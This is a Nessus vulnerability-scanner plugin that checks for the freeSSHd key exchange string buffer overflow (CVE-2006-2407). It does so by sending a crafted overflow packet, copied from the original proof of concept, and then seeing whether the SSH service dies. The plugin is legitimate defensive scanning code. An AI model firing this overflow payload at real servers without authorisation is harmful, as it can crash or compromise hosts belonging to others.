#
# Script Written By Ferdy Riphagen
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#

# Changes by Tenable:
# - Revised plugin title, removed extraneous OSVDB ref, moved see also to xref, family change (8/14/09)


include("compat.inc");

if (description) {
 script_id(21580);
 script_version("$Revision: 1.17 $");
 script_cvs_date("$Date: 2011/03/11 21:52:33 $");

 script_cve_id("CVE-2006-2407");
 script_bugtraq_id(17958);
 script_osvdb_id(25463);
 script_xref(name:"Secunia", value:"19846");

 script_name(english:"freeSSHd Key Exchange Algorithm String Remote Overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote SSH server is prone to a buffer overflow attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is using freeSSHd, a free SSH server for Windows. 

The version of freeSSHd installed on the remote host does not validate
the key exchange strings sent by a SSH client.  This can result in a
buffer overflow and possibly a compromise of the host if an
unauthenticated attacker sends a long key exchange string." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to FreeSSHd version 1.0.10 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/05/12");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Checks for a buffer overflow in freeSSHd");
 script_category(ACT_DENIAL);
 script_family(english:"Gain a shell remotely");
 script_copyright(english:"This script is Copyright (C) 2006-2011 Ferdy Riphagen");
 script_dependencies("find_service1.nasl");
 script_require_ports("Services/ssh", 22);
 exit(0);
}


include("global_settings.inc");
include("misc_func.inc");

if (report_paranoia < 1) exit(0, "This script is prone to false positive.");

port = get_service(svc:"ssh", default: 22, exit_on_fail: 1);

soc = open_sock_tcp(port);
if (!soc) exit(1, "Cannot connect to TCP port "+port+".");

banner = recv(socket:soc, length:128);
# nb: sample banner from freeSSHd 1.0.10:
#       SSH-2.0-WeOnlyDo 1.2.7
if (! egrep(pattern:"SSH.+WeOnlyDo", string:banner))
{
  close(soc);
  exit(0, "The SSH server on port "+port+" is not freeSSHD.");
}
 
 ident = "SSH-2.0-OpenSSH_4.2p1";
 exp = ident + raw_string(   # Used from the original POC. 
		0x0a, 0x00, 0x00, 0x4f, 0x04, 0x05, 
		0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xde) 
		+ crap(length:20300);

 send(socket:soc, data:exp);
 recv(socket:soc, length:1024);
 close(soc);

 soc = open_sock_tcp(port);
 if (! soc)
 {
   if (service_is_dead(port: port) <= 0)	# Alive or timeout
     exit(1, "Could not reconnect to port "+port+".");
   security_hole(port);
   exit(0);
 }
recv = recv(socket:soc, length:128);
close (soc);
if (! strlen(recv)) security_hole(port);
